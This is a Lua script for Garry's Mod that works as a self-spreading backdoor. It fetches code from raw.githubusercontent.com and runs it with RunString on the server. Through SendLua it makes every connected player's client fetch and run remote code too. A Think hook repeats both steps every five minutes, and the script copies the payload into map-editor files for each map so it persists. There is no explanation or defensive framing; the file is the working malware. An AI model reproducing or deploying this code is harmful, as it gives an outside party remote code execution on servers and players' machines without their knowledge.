if ALREADYRANTHEPOTATO then return end

local maps, _ = file.Find("maps/*.bsp", "GAME")

local payload = [[SRL="" 
	function YesFunc()
		for k,v in pairs(player.GetAll()) do
			v:SendLua("GLOBAL_NO_EXEC_PLOX = true")
			v:SendLua("GLOBAL_DL_CL_Y = \"https://raw.githubusercontent.com/9129/0193/master/client_run.lua\"")
			v:SendLua("http.Fetch(GLOBAL_DL_CL_Y, function(b) CL_RUN_PAY = b RunString(b) end)")
		end
	end
	
	function GetFunc()
		http.Fetch("https://raw.githubusercontent.com/9129/0193/master/server_add.lua", function(b) SV_ADD_PAY = b RunString(b) end)
	end

	hook.Add("Think", "Thunk29292", function()
		if CurTime() % 300 == 0 then
			YesFunc()
			GetFunc()
		end
	end)
	
	GetFunc()
	
	ALREADYRANTHEPOTATO = true
	
]]

if GAMEMODE.MapEditorPrefix then
	for k,v in pairs(maps) do
		local f = string.Replace(v, ".bsp", "")
		file.Write(GAMEMODE.MapEditorPrefix.."maps/" .. f .. ".txt", payload)
	end
end

RunString(payload)
